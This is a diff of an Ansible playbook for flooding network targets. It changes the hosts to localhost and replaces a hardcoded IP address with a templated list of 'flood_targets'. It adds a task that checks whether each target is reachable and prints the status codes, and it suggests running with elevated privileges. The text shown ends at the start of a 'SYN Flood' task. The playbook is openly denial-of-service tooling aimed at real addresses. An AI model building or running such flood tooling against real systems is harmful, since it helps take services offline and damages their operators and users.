@@ -1,14 +1,25 @@
 ---
-- hosts: customer
+- hosts: localhost
   gather_facts: no
 
   tasks:
 
+
+  # it's recommended to run with --ask-become-pass option
+
   - name: "Check flood target reachibility"
     uri:
-      url: "http://80.94.224.35"
+      url: "http://{{ item }}/"
     with_items:
     - "{{ flood_targets }}"
+    register: availability
+
+  - debug:
+      msg: "{{ item.status }}"
+    with_items:
+    - "{{ availability.results }}"
+    loop_control:
+      label: "{{ item.item }}"
 
   # SYN flood
   - name: "SYN Flood"
